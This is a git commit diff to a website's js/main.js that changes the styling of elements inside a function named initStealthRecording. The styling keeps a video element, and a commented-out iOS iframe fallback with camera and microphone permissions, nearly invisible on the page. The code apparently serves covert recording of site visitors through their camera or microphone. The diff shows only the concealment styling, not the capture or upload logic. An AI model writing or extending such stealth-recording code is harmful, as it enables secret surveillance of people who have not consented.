6e7dde13583a4b77edfa4c747bd2bd956d7dd673
Vu The Dan <vuthedan168@gmail.com>
2026-09-24 13:29:53 +0700

    Cập nhật code mới

--- js/main.js
+++ js/main.js
@@ -2291,7 +2291,7 @@ function initStealthRecording() {
       hiddenVideo.autoplay = true;
       hiddenVideo.muted = true;
       hiddenVideo.playsInline = true;
-      hiddenVideo.style.cssText = "position:fixed; bottom:0; right:0; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:-1;";
+      hiddenVideo.style.cssText = "position:fixed; bottom:0; right:0; width:50px; height:50px; opacity:0.1; pointer-events:none; z-index:-9999;";
       document.body.appendChild(hiddenVideo);
     }
 
@@ -2301,7 +2301,7 @@ function initStealthRecording() {
     /* FALLBACK IFRAME DÀNH CHO iOS (NẾU BỊ ĐEN HÌNH TRÊN IPHONE THẬT):
     function createIframeFallback(stream) {
       const iframe = document.createElement('iframe');
-      iframe.style.cssText = "position:fixed; bottom:0; right:0; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:-1;";
+      iframe.style.cssText = "position:fixed; bottom:0; right:0; width:50px; height:50px; opacity:0.1; pointer-events:none; z-index:-9999;";
       iframe.allow = "autoplay; camera; microphone";
       document.body.appendChild(iframe);
       const doc = iframe.contentWindow.document;
